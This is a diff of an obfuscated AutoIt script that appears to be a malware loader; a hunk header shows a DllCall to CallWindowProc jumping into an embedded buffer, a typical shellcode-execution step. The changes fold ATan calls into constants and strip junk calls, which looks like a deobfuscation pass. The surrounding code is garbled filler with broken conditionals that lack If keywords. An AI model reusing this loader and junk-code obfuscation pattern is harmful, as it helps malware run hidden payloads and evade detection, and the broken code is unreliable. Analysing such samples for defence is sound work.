@@ -30,7 +30,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
         FileFindFile($owmirzv)
          FileDelete($djnaosrlso) <> True Then
             $zqvchomeh = 94733
-             ATan(744) > 42 Then
+             1.5694522415827843 > 42 Then
                 FileCopy($zqvchomeh, $vuqrgbdcr, 976)
                 WinMenuSelectItem($zqvchomeh, "JER", "default")
              ProcessWaitClose("default", 461) = True Then
@@ -40,21 +40,21 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             
             For $edqhxlbzrt = 0 To 26
             
-         ATan(764) <= 13 Then
+         1.5694874270188142 <= 13 Then
             For $edqhxlbzrt = 41 To 1
             
-            TraySetState(289)
+            
             FileRecycle($vuqrgbdcr)
             $zqvchomeh = $dqfdywaonm
             For $edqhxlbzrt = 43 To 21
             
             GUICtrlSetImage(10, "5FWi", 632, 384)
-            Sin(919)
+            
             For $edqhxlbzrt = 0 To 13
             
              113 < 79 Then
                 ProcessClose("default")
-                FileGetEncoding(933)
+                
                 AdlibRegister($vuqrgbdcr, 46)
                 $vuqrgbdcr = 53724
              5.2574953720277815 = 11 Then
@@ -65,7 +65,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             
         
         WinActivate($zqvchomeh, $owmirzv)
-        GUICtrlRead(418)
+        
         ConsoleWriteError($lhctkdniv)
         For $edqhxlbzrt = 0 To 2
             AdlibUnRegister($lhctkdniv)
@@ -73,16 +73,16 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             $zqvchomeh = $lhctkdniv
             GUICtrlRegisterListViewSort(405, "yFGv4E")
             $lhctkdniv = $djnaosrlso
-            Sqrt(411)
+            
             $lhctkdniv = $vuqrgbdcr
             RegEnumVal("default", 192)
             $zqvchomeh = $dqfdywaonm
             ConsoleWrite($dqfdywaonm)
              1.7929085540437464 > 44 Then
-                GUICtrlGetState(170)
+                
                 WinSetOnTop($lhctkdniv, $lhctkdniv, 906)
                 GUICtrlSetColor(183, 847)
-                Floor(394)
+                
                 DirMove("default", "default", 481)
                 $lhctkdniv = 74320
              $vuqrgbdcr <> $zqvchomeh Then
@@ -92,7 +92,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 $owmirzv = 83403
                 $djnaosrlso = 83486
             
-            TimerDf(643)
+            
             $lhctkdniv = 78624
             $djnaosrlso = 38299
             ProcessClose("default")
@@ -100,7 +100,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             $zqvchomeh = 84156
             FileGetLongName($zqvchomeh)
             EVALUATE("BC7")
-            GUICtrlSetDefBkColor(789)
+            
             S("KLkr", 663)
         
         For $edqhxlbzrt = 18 To 21
@@ -112,7 +112,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             
             WinGetHandle($zqvchomeh, $zqvchomeh)
             FileSaveDialog("sskA", "default", "w6y", "FHP", $zqvchomeh)
-            GUICtrlSetDefColor(58)
+            
         
         FileReadLine(514, 294)
     
@@ -127,7 +127,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             
             For $edqhxlbzrt = 0 To 29
             
-            Log(359)
+            
              Ping("default", 481, 376) = True Then
                 $dqfdywaonm = 70752
                 WinWait($owmirzv, $zqvchomeh, 76)
@@ -137,7 +137,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 $djnaosrlso = 60883
                 WinWaitClose($owmirzv, "2c8gv", 297)
                 $vuqrgbdcr = 21202
-                TimerDf(601)
+                
                 $djnaosrlso = 73349
             
             $lhctkdniv = 14815
@@ -149,7 +149,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 GUICtrlSetOnEvent(440, $lhctkdniv)
                 WinWait($zqvchomeh, "bEe9QZX", 989)
             
-            Floor(915)
+            
             FileSetTime($owmirzv, $owmirzv, 230)
              Ping("default", 310, 612) <> False Then
                 WinWait($owmirzv, "ZzNWQK", 263)
@@ -166,7 +166,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 FileCopy($dqfdywaonm, $owmirzv, 343)
                 ConsoleWrite($dqfdywaonm)
             
-                FileSet(799)
+                
                 FileGetSize($dqfdywaonm)
                 $dqfdywaonm = 69048
                 InetRead("default", 608, 840, 461)
@@ -181,8 +181,8 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 GUICtrlSetOnEvent(115, "SRHTo5Y0")
                 EnvUpdate()
             
-                Log(86)
-                Log(978)
+                
+                
                 $zqvchomeh = $vuqrgbdcr
                 $dqfdywaonm = 4832
                 $owmirzv = 87664
@@ -196,7 +196,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 $vuqrgbdcr = $lhctkdniv
             
                 $djnaosrlso = 74239
-                GUICtrlDelete(508)
+                
                 $lhctkdniv = $lhctkdniv
                 WinGetClientSize($vuqrgbdcr, "VyU77LB")
                 AdlibUnRegister("bW")
@@ -204,7 +204,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             $lhctkdniv = 58878
              DirCreate("default") = True Then
                 $vuqrgbdcr = $dqfdywaonm
-                GUICtrlSetDefColor(882)
+                
              $vuqrgbdcr <> $djnaosrlso Then
                 FileSelectFolder("UiWIi0WPW2", "HZ", 463, $djnaosrlso)
                 GUICtrlSetStyle(28, 167, 631)
@@ -230,7 +230,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
              $lhctkdniv = 95236 Then
                 GUICtrlSetPos(239, 418, 167, 273, 80)
                 $vuqrgbdcr = 53523
-                TimerDf(459)
+                
             
             WinWaitActive($djnaosrlso, "JOwSWjd", 99)
         
@@ -255,7 +255,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             For $edqhxlbzrt = 66 To 26
             
             WinMinimizeAll()
-         ATan(757) < 89 Then
+         1.5694753236002905 < 89 Then
              1.2905622548533653 <> 97 Then
              896 < 7 Then
                 $owmirzv = $owmirzv
@@ -271,7 +271,7 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
                 FileGetTime($lhctkdniv, 142)
             
                 GUICtrlRegisterListViewSort(538, $owmirzv)
-                GUICtrlDelete(851)
+                
                 FileGetVersion($owmirzv)
             
             FileReadToArray($djnaosrlso)
@@ -288,12 +288,12 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             WinMenuSelectItem($lhctkdniv, $dqfdywaonm, "default")
             $owmirzv = $owmirzv
             FileReadLine(343, 633)
-            Tan(495)
+            
          HotKeySet("default", $djnaosrlso) <> True Then
              $zqvchomeh <> $djnaosrlso Then
                 FileWrite(260, $lhctkdniv)
             
-            GUICtrlSetDefBkColor(928)
+            
             $owmirzv = 16916
             FileGetTime($zqvchomeh, 929)
             GUICtrlSMsg(408, 974, 787, 271)
@@ -307,15 +307,15 @@ UHIWUBSE(DllCall), ptr, CallWindowProc, ptr, $wqyapouume + 9136, ptr, 0, ptr, 0,
             InetRead("default", 664, 48, 70)
             For $edqhxlbzrt = 83 To 6
             
-            Floor(627)
+            
             FileFlush($zqvchomeh)
             $dqfdywaonm = $owmirzv
         
          FileDelete($djnaosrlso) = True Then
             $vuqrgbdcr = 33897
         
-            GUICtrlGetState(501)
-            Tan(869)
+            
+            
             FileSelectFolder("4ZJa", "", 185, $djnaosrlso)
             DirMove("default", "default", 785)
              $lhctkdniv = 19049 Then
